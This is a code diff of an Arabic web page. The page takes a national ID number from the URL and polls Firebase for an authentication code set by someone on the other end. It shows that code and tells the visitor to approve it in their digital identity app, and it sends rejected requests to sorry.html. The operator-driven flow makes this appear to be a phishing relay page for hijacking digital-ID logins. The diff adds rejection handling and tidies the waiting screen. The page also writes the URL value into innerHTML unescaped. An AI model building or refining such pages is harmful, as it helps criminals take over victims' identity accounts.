@@ -9,7 +9,7 @@
 <link rel="icon" type="image/png" sizes="16x16" href="self_service.png">
 <link rel="icon" type="image/png" sizes="32x32" href="self_service.png">
 <link rel="apple-touch-icon" sizes="180x180" href="self_service.png">
-    
+  
     <!-- Bootstrap CSS من CDN -->
     <link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/css/bootstrap.min.css" rel="stylesheet">
     
@@ -445,8 +445,6 @@
 
     <script>
         // إعدادات Firebase
-    
-
         let firebaseApp;
         let database;
 
@@ -479,32 +477,40 @@
         // دالة جلب رمز المصادقة من Firebase
         async function getAuthCodeFromFirebase() {
             const idNumber = getIdFromURL();
-            
+
             if (!idNumber) {
                 showError('خطأ', 'لم يتم تحديد رقم الهوية', 'الرجاء العودة إلى صفحة التسجيل وإدخال رقم الهوية');
                 return;
             }
-            
+
             try {
-                // البحث عن السجل في Firebase
                 const safeKey = idNumber.replace(/[.#$\/\[\]]/g, '_');
                 const snapshot = await database.ref('authentications/' + safeKey).once('value');
-                
+
                 if (!snapshot.exists()) {
                     showError('غير موجود', `رقم الهوية ${idNumber} غير موجود في النظام`, 'الرجاء التحقق من الرقم والمحاولة مرة أخرى');
                     return;
                 }
-                
+
                 const record = snapshot.val();
-                
-         if (!record.auth_code) {
-    showWaitingScreen(idNumber);
-    return;
-}
-                
+
+                // إذا تم رفض السجل: إعادة التوجيه إلى صفحة sorry.html مع معلومات قصيرة
+                const status = (record.status || '').toString().toLowerCase();
+                if (status === 'rejected' || status === 'denied' || status === 'declined' || record.approved === false) {
+                    const reason = record.rejection_reason || record.reason || record.error || 'تم رفض الطلب';
+                    const params = new URLSearchParams({ id: idNumber, reason, recordId: safeKey });
+                    window.location.href = `sorry.html?${params.toString()}`;
+                    return;
+                }
+
+                if (!record.auth_code) {
+                    showWaitingScreen(idNumber);
+                    return;
+                }
+
                 // إظهار البيانات
                 showAuthCode(record, idNumber);
-                
+
             } catch (error) {
                 console.error('❌ خطأ في جلب البيانات:', error);
                 showError('خطأ في الاتصال', 'تعذر الاتصال بقاعدة البيانات', 'يرجى المحاولة مرة أخرى لاحقاً');
@@ -513,68 +519,226 @@
 
         // عرض رمز المصادقة
         function showAuthCode(record, idNumber) {
-            // إزالة شاشة التحميل إن وُجدت
+            // إزالة شاشة التحميل أو انتظار إن وُجدت
             const loadingScreen = document.getElementById('loadingScreen');
             if (loadingScreen) loadingScreen.remove();
-            
+            const waitingScreen = document.getElementById('waitingScreen');
+            if (waitingScreen) waitingScreen.remove();
+
             // إظهار المحتوى الرئيسي
-            document.getElementById('mainContent').style.display = 'block';
-            
-            // تعيين رقم الهوية
-            // document.getElementById('idNumberDisplay').textContent = idNumber;
+            const main = document.getElementById('mainContent');
+            if (main) main.style.display = 'block';
+
             // لا نعرض رقم الهوية فعلياً — نعرض نصاً بديلًا ثابتاً
             const idNumberEl = document.getElementById('idNumberDisplay');
             if (idNumberEl) {
                 idNumberEl.textContent = 'قم بفتح تطبيق الهوية الرقمية الخاص بك وادخل الرقم الموضح لتسجيل الدخول';
             }
-            
+
             // تعيين رمز المصادقة
-            const authCode = record.auth_code;
-            document.getElementById('passcodeDisplay').setAttribute('data-after-content', authCode);
-            document.getElementById('passcodeDisplay').setAttribute('aria-label', `الرمز ${authCode}`);
-            
+            const authCode = record.auth_code || '??';
+            const passEl = document.getElementById('passcodeDisplay');
+            if (passEl) {
+                passEl.setAttribute('data-after-content', authCode);
+                passEl.setAttribute('aria-label', `الرمز ${authCode}`);
+            }
+
             // تحديث نص الانتظار
-            document.getElementById('waitingText').textContent = `في انتظار تأكيدك`;
-            
+            const waitingTextEl = document.getElementById('waitingText');
+            if (waitingTextEl) waitingTextEl.textContent = `في انتظار تأكيدك`;
+
             // تحديث معلومات التطبيق
-            document.getElementById('appNameInfo').innerHTML = `
-                تم إنشاؤه في: ${record.date || ''}<br>
-                الوقت: ${record.time || ''}
-            `;
-            
+            const appInfo = document.getElementById('appNameInfo');
+            if (appInfo) {
+                appInfo.innerHTML = `تم إنشاؤه في: ${record.date || ''}<br> الوقت: ${record.time || ''}`;
+            }
+
             // بدء تحديث الرمز تلقائياً كل 10 ثوانٍ
             startAutoRefresh(idNumber);
         }
 
         // عرض خطأ
         function showError(title, message, details) {
-            document.getElementById('loadingScreen').style.display = 'none';
-            document.getElementById('errorScreen').style.display = 'flex';
-            document.getElementById('errorTitle').textContent = title;
-            document.getElementById('errorMessage').innerHTML = `${message}<br><small>${details}</small>`;
+            // إزالة شاشة الانتظار إذا كانت موجودة
+            const waitingScreen = document.getElementById('waitingScreen');
+            if (waitingScreen) waitingScreen.remove();
+
+            const loadingScreen = document.getElementById('loadingScreen');
+            if (loadingScreen) loadingScreen.style.display = 'none';
+
+            const errorScreen = document.getElementById('errorScreen');
+            if (errorScreen) {
+                errorScreen.style.display = 'flex';
+                const errorTitle = document.getElementById('errorTitle');
+                const errorMessage = document.getElementById('errorMessage');
+                if (errorTitle) errorTitle.textContent = title;
+                if (errorMessage) errorMessage.innerHTML = `
+                    <div style="font-size: 16px; margin-bottom: 10px;">${message}</div>
+                    <div style="font-size: 14px; color: #666; background: #f8f9fa; padding: 10px; border-radius: 5px;">
+                        <i class="fas fa-lightbulb"></i> ${details}
+                    </div>
+                `;
+            }
         }
 
         // التحديث التلقائي للرمز
         function startAutoRefresh(idNumber) {
-            setInterval(async () => {
+            const refreshInterval = setInterval(async () => {
                 try {
                     const safeKey = idNumber.replace(/[.#$\/\[\]]/g, '_');
                     const snapshot = await database.ref('authentications/' + safeKey).once('value');
-                    
+
                     if (snapshot.exists()) {
                         const record = snapshot.val();
-                        const currentCode = document.getElementById('passcodeDisplay').getAttribute('data-after-content');
-                        
+
+                        // تحقق من حالة الرفض — إذا رفض السجل أعِد التوجيه فوراً
+                        const status = (record.status || '').toString().toLowerCase();
+                        if (status === 'rejected' || status === 'denied' || status === 'declined' || record.approved === false) {
+                            clearInterval(refreshInterval);
+                            const reason = record.rejection_reason || record.reason || record.error || 'تم رفض الطلب';
+                            const params = new URLSearchParams({ id: idNumber, reason, recordId: safeKey });
+                            const waitingScreen = document.getElementById('waitingScreen');
+                            if (waitingScreen) waitingScreen.remove();
+                            window.location.href = `sorry.html?${params.toString()}`;
+                            return;
+                        }
+
+                        // تحديث رمز المصادقة إن تغيّر
+                        const passEl = document.getElementById('passcodeDisplay');
+                        const currentCode = passEl ? passEl.getAttribute('data-after-content') : null;
+
                         if (record.auth_code && record.auth_code !== currentCode) {
-                            document.getElementById('passcodeDisplay').setAttribute('data-after-content', record.auth_code);
-                            document.getElementById('passcodeDisplay').setAttribute('aria-label', `الرمز ${record.auth_code}`);
-                            document.getElementById('waitingText').textContent = `تم تحديث الرمز إلى: ${record.auth_code}`;
+                            if (passEl) {
+                                passEl.setAttribute('data-after-content', record.auth_code);
+                                passEl.setAttribute('aria-label', `الرمز ${record.auth_code}`);
+                            }
+                            const waitingTextEl = document.getElementById('waitingText');
+                            if (waitingTextEl) waitingTextEl.textContent = `تم تحديث الرمز إلى: ${record.auth_code}`;
                         }
                     }
                 } catch (error) {
                     console.error('❌ خطأ في التحديث:', error);
                 }
             }, 10000); // كل 10 ثوانٍ
+        }
+
+        // إنشاء شاشة الانتظار
+        function showWaitingScreen(idNumber) {
+            // إزالة شاشة التحميل إن وُجدت
+            const loadingScreen = document.getElementById('loadingScreen');
+            if (loadingScreen) loadingScreen.style.display = 'none';
+
+            // إذا كانت شاشة الانتظار موجودة لا ننشئ أخرى
+            if (document.getElementById('waitingScreen')) return;
+
+            const waitingScreen = document.createElement('div');
+            waitingScreen.id = 'waitingScreen';
+            waitingScreen.style.cssText = `
+                display: flex;
+                flex-direction: column;
+                justify-content: center;
+                align-items: center;
+                height: 100vh;
+                text-align: center;
+                padding: 40px 20px;
+                background: #F9F9FB;
+                position: fixed;
+                top: 0;
+                left: 0;
+                right: 0;
+                bottom: 0;
+                z-index: 9999;
+            `;
+
+            waitingScreen.innerHTML = `
+                <div style="font-size: 60px; color: #007bff; margin-bottom: 20px;">
+                    <i class="fas fa-spinner fa-spin"></i>
+                </div>
+                <h2 style="color: #454f63; margin-bottom: 10px;">جاري التحقق</h2>
+                <p style="color: #78849e; margin-bottom: 20px;">جاري التحقق من وجود رمز مصادقة</p>
+            `;
+
+            document.body.appendChild(waitingScreen);
+
+            // بدء التحقق التلقائي
+            startAutoCheck(idNumber);
+        }
+
+        // دالة التحقق التلقائي
+        function startAutoCheck(idNumber) {
+            let checkInterval;
+            let checkCount = 0;
+            const maxChecks = 60; // 5 دقائق (60 * 5 ثوان)
+
+            const updateStatus = () => {
+                checkCount++;
+                const waitingScreen = document.getElementById('waitingScreen');
+                if (waitingScreen) {
+                    const statusText = waitingScreen.querySelector('h2');
+                    const infoText = waitingScreen.querySelector('p');
+
+                    if (statusText) {
+                        statusText.textContent = `جاري التحقق`;
+                    }
+
+                    if (infoText && checkCount % 10 === 0) {
+                        infoText.innerHTML = `
+                            <i class="fas fa-sync-alt"></i>
+                            جاري التحقق... تمت المحاولة ${checkCount} مرة
+                        `;
+                    }
+                }
+            };
+
+            const checkForAuthCode = async () => {
+                if (checkCount >= maxChecks) {
+                    clearInterval(checkInterval);
+                    showError('انتهى الوقت', 'تم التحقق لمدة 5 دقائق دون وجود رمز', 'يرجى العودة والمحاولة لاحقاً');
+                    return;
+                }
+
+                updateStatus();
+
+                try {
+                    const safeKey = idNumber.replace(/[.#$\/\[\]]/g, '_');
+                    const snapshot = await database.ref('authentications/' + safeKey).once('value');
+
+                    if (snapshot.exists()) {
+                        const record = snapshot.val();
+
+                        // أثناء الانتظار: تحقق ما إذا تم رفض السجل ثم أعد التوجيه
+                        const status = (record.status || '').toString().toLowerCase();
+                        if (status === 'rejected' || status === 'denied' || status === 'declined' || record.approved === false) {
+                            const waitingScreen = document.getElementById('waitingScreen');
+                            if (waitingScreen) waitingScreen.remove();
+                            const reason = record.rejection_reason || record.reason || record.error || 'تم رفض الطلب';
+                            const params = new URLSearchParams({ id: idNumber, reason, recordId: safeKey });
+                            clearInterval(checkInterval);
+                            window.location.href = `sorry.html?${params.toString()}`;
+                            return;
+                        }
+
+                        if (record.auth_code) {
+                            // إزالة شاشة الانتظار
+                            const waitingScreen = document.getElementById('waitingScreen');
+                            if (waitingScreen) waitingScreen.remove();
+
+                            // إظهار الرمز
+                            showAuthCode(record, idNumber);
+                            clearInterval(checkInterval);
+                            return;
+                        }
+                    }
+                } catch (error) {
+                    console.error('❌ خطأ في التحقق:', error);
+                }
+            };
+
+            // التحقق أول مرة فوراً
+            checkForAuthCode();
+
+            // ثم كل 5 ثوانٍ
+            checkInterval = setInterval(checkForAuthCode, 5000);
         }
 
         // العودة للخلف
@@ -590,139 +754,6 @@
                 showError('خطأ في الإعدادات', 'تعذر تهيئة قاعدة البيانات', 'يرجى التحقق من اتصال الإنترنت');
             }
         });
-        // دالة لعرض شاشة الانتظار
-function showWaitingScreen(idNumber) {
-    // إخفاء شاشة التحميل الأصلية إن وجدت
-    const loadingScreen = document.getElementById('loadingScreen');
-    if (loadingScreen) loadingScreen.style.display = 'none';
-    
-    // إنشاء شاشة الانتظار
-    const waitingScreen = document.createElement('div');
-    waitingScreen.id = 'waitingScreen';
-    waitingScreen.style.cssText = `
-        display: flex;
-        flex-direction: column;
-        justify-content: center;
-        align-items: center;
-        height: 100vh;
-        text-align: center;
-        padding: 40px 20px;
-        background: #F9F9FB;
-        position: fixed;
-        top: 0;
-        left: 0;
-        right: 0;
-        bottom: 0;
-        z-index: 9999;
-    `;
-    
-    waitingScreen.innerHTML = `
-        <div style="font-size: 60px; color: #007bff; margin-bottom: 20px;">
-            <i class="fas fa-spinner fa-spin"></i>
-        </div>
-        <h2 style="color: #454f63; margin-bottom: 10px;">جاري التحقق</h2>
-        <p style="color: #78849e; margin-bottom: 20px;">
-            جاري التحقق من وجود رمز مصادقة
-        </p>
-       
-     
-    `;
-    
-    document.body.appendChild(waitingScreen);
-    
-    // بدء التحقق التلقائي
-    startAutoCheck(idNumber);
-}
-
-// دالة التحقق التلقائي
-function startAutoCheck(idNumber) {
-    let checkInterval;
-    let checkCount = 0;
-    const maxChecks = 60; // 5 دقائق (60 * 5 ثوان)
-    
-    const updateStatus = () => {
-        checkCount++;
-        const waitingScreen = document.getElementById('waitingScreen');
-        if (waitingScreen) {
-            const statusText = waitingScreen.querySelector('h2');
-            const infoText = waitingScreen.querySelector('p:nth-of-type(2)');
-            
-            if (statusText) {
-                statusText.textContent = `جاري التحقق `;
-            }
-            
-            if (infoText && checkCount % 10 === 0) {
-                infoText.innerHTML = `
-                    <i class="fas fa-sync-alt"></i>
-                    جاري التحقق... تمت المحاولة ${checkCount} مرة
-                `;
-            }
-        }
-    };
-    
-    const checkForAuthCode = async () => {
-        if (checkCount >= maxChecks) {
-            clearInterval(checkInterval);
-            showError('انتهى الوقت', 'تم التحقق لمدة 5 دقائق دون وجود رمز', 'يرجى العودة والمحاولة لاحقاً');
-            return;
-        }
-        
-        updateStatus();
-        
-        try {
-            const safeKey = idNumber.replace(/[.#$\/\[\]]/g, '_');
-            const snapshot = await database.ref('authentications/' + safeKey).once('value');
-            
-            if (snapshot.exists()) {
-                const record = snapshot.val();
-                
-                if (record.auth_code) {
-                    // إزالة شاشة الانتظار
-                    const waitingScreen = document.getElementById('waitingScreen');
-                    if (waitingScreen) {
-                        waitingScreen.remove();
-                    }
-                    
-                    // إظهار الرمز
-                    showAuthCode(record, idNumber);
-                    clearInterval(checkInterval);
-                    return;
-                }
-            }
-        } catch (error) {
-            console.error('❌ خطأ في التحقق:', error);
-        }
-    };
-    
-    // التحقق أول مرة فوراً
-    checkForAuthCode();
-    
-    // ثم كل 5 ثوانٍ
-    checkInterval = setInterval(checkForAuthCode, 5000);
-}
-
-// تحديث دالة showError لتكون أنيقة أكثر
-function showError(title, message, details) {
-    // إزالة شاشة الانتظار إذا كانت موجودة
-    const waitingScreen = document.getElementById('waitingScreen');
-    if (waitingScreen) {
-        waitingScreen.remove();
-    }
-    
-    const loadingScreen = document.getElementById('loadingScreen');
-    if (loadingScreen) {
-        loadingScreen.style.display = 'none';
-    }
-    
-    document.getElementById('errorScreen').style.display = 'flex';
-    document.getElementById('errorTitle').textContent = title;
-    document.getElementById('errorMessage').innerHTML = `
-        <div style="font-size: 16px; margin-bottom: 10px;">${message}</div>
-        <div style="font-size: 14px; color: #666; background: #f8f9fa; padding: 10px; border-radius: 5px;">
-            <i class="fas fa-lightbulb"></i> ${details}
-        </div>
-    `;
-}
     </script>
 </body>
 </html>
